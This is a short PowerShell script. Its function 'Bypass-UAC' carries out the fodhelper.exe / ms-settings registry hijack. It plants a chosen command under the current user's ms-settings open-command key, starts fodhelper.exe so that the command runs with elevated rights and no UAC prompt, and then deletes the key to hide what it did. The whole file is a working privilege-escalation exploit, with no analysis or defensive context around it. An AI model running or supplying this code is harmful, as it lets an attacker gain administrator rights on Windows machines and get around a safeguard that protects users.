function Bypass-UAC() {
  param(
    [String]$ExecCommand = "cmd /c powershell.exe"
  )

  New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force
  New-ItemProperty -Path "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
  Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $ExecCommand -Force

  $FilePath = ""
  if(Is64bitProcess) {
    $FilePath = "$Env:WINDIR\System32\cmd.exe"
  } else {
    $FilePath = "$Env:WINDIR\Sysnative\cmd.exe"
  }
 
  Start-Process -FilePath $FilePath -ArgumentList "/c START %WINDIR%\System32\fodhelper.exe"

  Start-Sleep 5
  Remove-Item "HKCU:\SOFTWARE\Classes\ms-settings\" -Recurse -Force
}

function Is64bitProcess() {
  Add-Type -MemberDefinition @'
  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, CallingConvention = CallingConvention.Winapi)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool IsWow64Process2(System.IntPtr hProcess, out ushort pProcessMachine, out ushort pNativeMachine);
'@  -Name NativeMethods -Namespace Kernel32
 
  $CurrentProcess = Get-Process -ID $PID
  [UInt16]$ProcessMachine = 0
  [UInt16]$NativeMachine = 0
 
  $null = [Kernel32.NativeMethods]::IsWow64Process2($CurrentProcess.Handle, [ref]$ProcessMachine, [ref]$NativeMachine)

  if($ProcessMachine -eq 0) {
    return $True
  } else {
    return $False
  }
}

